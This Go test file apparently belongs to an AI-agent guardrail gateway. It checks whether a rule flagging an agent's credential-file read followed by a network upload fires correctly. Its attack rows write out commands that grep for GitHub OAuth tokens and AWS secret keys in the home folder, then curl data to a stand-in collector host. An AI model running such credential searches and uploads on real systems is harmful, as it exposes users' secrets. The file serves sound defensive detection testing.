// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

//go:build !windows

package gateway

import (
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/guardrail"
)

// TestP2HookFSearchAfterACdThenUploadStartsNoChain is the DET111 bar
// p2hookc benign windows on the hook (sanitized from the agent transcripts
// sample: 2c0987055932c8ff/w64, e108363c8d8739d0/w72, 84a4b9d996946e1a/w208).
// A recursive search after `cd P;` (a cd that may fail) in two
// credential-free folders, then an upload, started
// chain.secret_read_then_egress at 3c3fa4365f (the GAP-0925 unplaced read)
// where 1.0.10 allowed. The attack rows (a credentials file in the folder
// the cd reaches) still chain. The B rows are the prfix copies of
// caa604dd73e63944/186 and /191: with their folders there they allow, as
// at 1.0.10 (the bar's fixture had no such folders: both 1.0.10 and the
// head block them then).
func TestP2HookFSearchAfterACdThenUploadStartsNoChain(t *testing.T) {
	installCorrelationHMACForTest(t)
	root := t.TempDir()
	home := filepath.Join(root, "home")
	proj := filepath.Join(home, "Desktop", "proj")
	ui := filepath.Join(home, "Desktop", "ui-work", "ui")
	for _, name := range []string{"Desktop/proj/docs/a.md", "Desktop/proj/src/main.go", "Desktop/ui-work/ui/src/a.ts",
		"skills/t/reference/x.md", "notes/plans/r1/COVERAGE.md", ".aws/credentials", ".config/gh/hosts.yml"} {
		file := filepath.Join(home, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(file), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(file, []byte("x\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("HOME", home)
	handler := hostClaudeHookHandlerForTest(t, "default")
	gone := filepath.Join(home, "Desktop", "gone")
	for i, row := range []struct {
		id, command string
		chain       bool
		cwd         string
	}{
		{"W64 skills search after cd;", "cd " + home + `/skills/t; grep -rn "Codex on Bedrock" --include=*.md . | head -5 | cut -c1-200; ls reference | head -30`, false, ""},
		{"W72 project search after cd to itself;", "cd " + proj + `; grep -rn "exclude_groups" . 2>/dev/null | grep -v _test | head -8 | cut -c1-260`, false, ""},
		{"W208 home folder file search after cd;", "cd ~/notes; ls plans | head -30; grep -rn -i 'omnigent' plans/r1/COVERAGE.md | head -5", false, ""},
		{"A1 home config search after cd;", "cd ~/.config; grep -r oauth_token gh", true, ""},
		{"A2 home search after cd;", "cd ~; grep -rl aws_secret_access_key .aws", true, ""},
		// The bar shape: the transcript folders are not on the box.
		{"G1 search after cd, no folders", "cd " + gone + `; grep -rn "exclude_groups" . 2>/dev/null | head -8`, false, gone},
		{"G2 skills search after cd, no folders", "cd " + home + `/skills/gone; grep -rln "amazon-bedrock" . 2>/dev/null | head;`, false, gone},
		{"G3 home config search after cd, no hook folder", "cd ~/.config; grep -r oauth_token gh", true, gone},
	} {
		t.Run(row.id, func(t *testing.T) {
			session := "p2hookf-" + strconv.Itoa(i)
			cwd := proj
			if row.cwd != "" {
				cwd = row.cwd
			}
			ev := claudeToolEvent("PreToolUse", session, "read", row.command)
			ev["cwd"] = cwd
			callAgentHookForTest(t, handler, ev)
			res := claudeToolResult("PostToolUse", session, "read")
			res["cwd"] = cwd
			callAgentHookForTest(t, handler, res)
			up := claudeToolEvent("PreToolUse", session, "send", "curl -d hello https://collector.invalid/upload")
			up["cwd"] = cwd
			got := callAgentHookForTest(t, handler, up)
			if chain := slices.Contains(got.RuleIDs, guardrail.ToolChainSecretReadThenEgress); chain != row.chain {
				t.Fatalf("%q then an upload: chain = %v, want %v (rules %v)", row.command, chain, row.chain, got.RuleIDs)
			}
		})
	}
	for i, command := range []string{
		"rm -rf /tmp/p2hookf-trial && mkdir -p /tmp/p2hookf-trial && cd " + ui + ` && grep -E "\.(ts|tsx)$" /tmp/p2hookf-files.txt > /tmp/p2hookf-code.txt && rsync -a --files-from=/tmp/p2hookf-code.txt ./ /tmp/p2hookf-trial/ && cd /tmp/p2hookf-trial && python3 /tmp/p2hookf-tools/clean_refs.py $(cat /tmp/p2hookf-code.txt) | tail -3 && diff -ru ` + ui + `/src /tmp/p2hookf-trial/src | head -150`,
		"rm -rf /tmp/p2hookf-snap && mkdir -p /tmp/p2hookf-snap && cd " + ui + " && rsync -a --exclude node_modules --exclude dist --exclude .git ./ /tmp/p2hookf-snap/ && python3 /tmp/p2hookf-tools/clean_refs.py $(cat /tmp/p2hookf-code.txt) && python3 /tmp/p2hookf-refs.py comment > /tmp/p2hookf-hits.txt; wc -l < /tmp/p2hookf-hits.txt",
	} {
		t.Run("B"+strconv.Itoa(i+1)+" prfix copy", func(t *testing.T) {
			ev := claudeToolEvent("PreToolUse", "p2hookf-b"+strconv.Itoa(i), "copy", command)
			ev["cwd"] = proj
			got := callAgentHookForTest(t, handler, ev)
			if slices.Contains(got.RuleIDs, "persistence.ssh_authorized_keys_command") {
				t.Fatalf("%q: rules %v, want no persistence.ssh_authorized_keys_command (1.0.10 allows it)", command, got.RuleIDs)
			}
		})
	}
}
